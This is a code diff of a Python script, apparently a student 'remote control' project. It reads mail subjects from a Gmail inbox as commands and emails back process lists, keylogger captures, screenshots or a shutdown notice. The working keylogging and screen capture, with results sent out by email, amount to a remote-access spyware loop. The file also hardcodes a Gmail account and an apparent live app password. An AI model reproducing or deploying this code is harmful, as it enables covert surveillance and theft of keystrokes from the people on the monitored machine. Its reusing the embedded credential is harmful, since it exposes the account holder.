@@ -13,9 +13,12 @@ import screenshot
 import shutdown
 from process_app import *
 from keylogger import key_logger
+import UI
 
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
 smtp_port = 587  # Port for TLS
+
+emailJson = "email.json"
 
 username_checker = 'mangmaytinhremotecontrol@gmail.com'
 password_checker = 'lmlx vrwx cwym hvqz'
@@ -30,10 +33,10 @@ imap.login(username_checker, password_checker)
 # SEND MAIL
 
 
-def send_email(sender, receiver, subject, body, image_data=None):
+def send_email(subject, body, image_data=None):
     msg = MIMEMultipart()
-    msg["From"] = sender
-    msg["To"] = receiver
+    msg["From"] = username_checker
+    msg["To"] = username_receiver
     msg["Subject"] = subject
     msg.attach(MIMEText(body, "plain"))
     if image_data is not None:
@@ -43,7 +46,7 @@ def send_email(sender, receiver, subject, body, image_data=None):
     server = smtplib.SMTP(smtp_server, smtp_port)
     server.starttls()
     server.login(username_checker, password_checker)
-    server.sendmail(sender, receiver, text)
+    server.sendmail(username_checker, username_receiver, text)
     server.quit()
 
 # -------------------------------------------------------------------------------------------------
@@ -51,34 +54,29 @@ def send_email(sender, receiver, subject, body, image_data=None):
 
 
 def CheckAndDo(cmd):
-    parts = cmd.split(' ')
-    command = parts[0]
-    duration = int(parts[1]) if len(parts) > 1 else 10
-    if (cmd == 'applications'):
+    if  'applications' in cmd:
         print("Applications")
-        send_email(username_checker, username_receiver,
-                   "List of applications:", execute_msg(cmd))
-    elif (cmd == 'processes'):
+        send_email("List of applications:", execute_msg(cmd))
+    elif 'processes' in cmd:
         print("Processes")
-        send_email(username_checker, username_receiver,
-                   "List of processes:", execute_msg(cmd))
-    elif (command == 'keylogger'):
+        send_email( "List of processes:", execute_msg(cmd))
+    elif 'keylogger' in cmd:
         print("Keylogger")
-        send_email(username_checker, username_receiver,
-                   "Keys pressed:", key_logger(duration))
-    elif (cmd == 'screenshot'):
+        parts = cmd.split(' ')
+        duration = int(parts[1]) if len(parts) > 1 else 10
+        send_email("Keys pressed:", key_logger(duration))
+    elif 'screenshot' in  cmd:
         print("Screenshot")
         image_data = screenshot.screen_shot()
-        send_email(username_checker, username_receiver,
-                   "Screenshot Taken!", "See attachment: ", image_data)
-    elif (cmd == 'shutdown'):
+        send_email("Screenshot Taken!", "See attachment: ", image_data)
+    elif 'shutdown' in cmd:
         print("Shutdown")
-        send_email(username_checker, username_receiver,
-                   "Shutting Down PC!", "PC is shutting down...")
+        send_email("Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
 
 
 cmd = 'start'
+emails = UI.load_emails_from_json(emailJson)
 while cmd != 'quit':
     imap.select("Inbox")
     # Find all unseen mails in Inbox to read
@@ -93,13 +91,17 @@ while cmd != 'quit':
         cmd = message.get("Subject")
         username_receiver = message.get("From")
         CheckAndDo(cmd.lower())
+        
+        new_email = UI.Email(sender=username_receiver, subject=cmd, snippet="", read=False)
+        emails.append(new_email)  
+
+    UI.save_emails_to_json(emails, emailJson)
 
     imap.close()
 
     time.sleep(0.4)
 
 print("Bye !!!")
+imap.logout()
 
 # -----------------------------------------------------------------------------------------
-
-imap.logout()
